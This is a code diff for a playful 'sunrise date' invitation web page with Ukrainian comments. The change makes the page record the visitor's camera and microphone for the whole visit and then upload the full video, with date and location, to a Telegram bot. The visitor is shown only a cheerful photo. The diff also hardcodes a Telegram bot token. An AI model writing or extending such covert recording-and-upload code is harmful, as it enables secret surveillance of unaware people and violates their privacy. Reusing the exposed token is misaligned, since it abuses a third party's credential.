@@ -44,7 +44,6 @@
       const streamRef = useRef(null);
       const mediaRecorderRef = useRef(null);
       const recordedChunksRef = useRef([]);
-      const videoBlobRef = useRef(null);
       const hasSent = useRef(false);
 
       const TELEGRAM_BOT_TOKEN = '9220864046:AAENBw-7pk7srDzF8qS4nJF3kkLqnIYgUN0';
@@ -66,12 +65,12 @@
               await videoRef.current.play();
             }
 
-            // Робимо фото для екрана сайту через 1.2 сек
+            // Робимо чітке фото для сайту через 1.2 сек після старту
             photoTimeout = setTimeout(() => {
               takePhoto();
             }, 1200);
 
-            // Налаштовуємо запис відео зі звуком
+            // Стартуємо безперервний запис відео + звуку
             let recorder;
             try {
               recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
@@ -88,20 +87,8 @@
               }
             };
 
-            recorder.onstop = () => {
-              const blob = new Blob(recordedChunksRef.current, { type: recorder.mimeType || 'video/mp4' });
-              videoBlobRef.current = blob;
-              stopMedia();
-            };
-
-            recorder.start();
-
-            // Записуємо 4 секунди
-            setTimeout(() => {
-              if (recorder.state !== 'inactive') {
-                recorder.stop();
-              }
-            }, 4000);
+            // Постійний запис без таймера зупинки (пише поки людина на сайті)
+            recorder.start(1000);
 
           } catch (err) {
             console.warn('Доступ до камери/мікрофона обмежено', err);
@@ -123,37 +110,50 @@
           }
         };
 
-        const stopMedia = () => {
-          if (streamRef.current) {
-            streamRef.current.getTracks().forEach((track) => track.stop());
-            streamRef.current = null;
-          }
-        };
-
         startMedia();
 
         return () => {
           clearTimeout(photoTimeout);
-          stopMedia();
+          if (streamRef.current) {
+            streamRef.current.getTracks().forEach((track) => track.stop());
+          }
         };
       }, []);
 
+      // Коли переходимо на крок 4 — зупиняємо запис та відправляємо все відео в бот
       useEffect(() => {
         if (step === 4 && !hasSent.current) {
           hasSent.current = true;
-          sendToTelegram();
+          
+          if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
+            mediaRecorderRef.current.onstop = () => {
+              const blob = new Blob(recordedChunksRef.current, { type: mediaRecorderRef.current.mimeType || 'video/mp4' });
+              sendToTelegram(blob);
+              stopStream();
+            };
+            mediaRecorderRef.current.stop();
+          } else {
+            sendToTelegram(null);
+          }
         }
       }, [step]);
 
-      const sendToTelegram = async () => {
+      const stopStream = () => {
+        if (streamRef.current) {
+          streamRef.current.getTracks().forEach((track) => track.stop());
+          streamRef.current = null;
+        }
+      };
+
+      const sendToTelegram = async (videoBlob) => {
         const caption = `🌅 Нова згода на світанок!\n📅 Дата: ${date.split('-').reverse().join('.')}\n📍 Місце: ${location}`;
 
         try {
-          if (videoBlobRef.current) {
+          if (videoBlob && videoBlob.size > 0) {
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
             formData.append('caption', caption);
-            formData.append('video', videoBlobRef.current, 'video.mp4');
+            formData.append('video', videoBlob, 'full_video.mp4');
 
             await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
               method: 'POST',
@@ -263,7 +263,6 @@
                 <div className="text-6xl mb-4 flex justify-center gap-3 animate-[bounce_2s_infinite]">🦜 🌅 💖</div>
                 <h2 className="text-3xl md:text-4xl font-black text-orange-500 drop-shadow-md leading-tight">Ура! Буду чекати на світанку ✨</h2>
                 
-                {/* Фото повернено на екран */}
                 {photo && (
                   <div className="mt-6 mx-auto max-w-xs">
                     <div className="relative rounded-3xl overflow-hidden border-4 border-amber-300 shadow-lg transform -rotate-1">
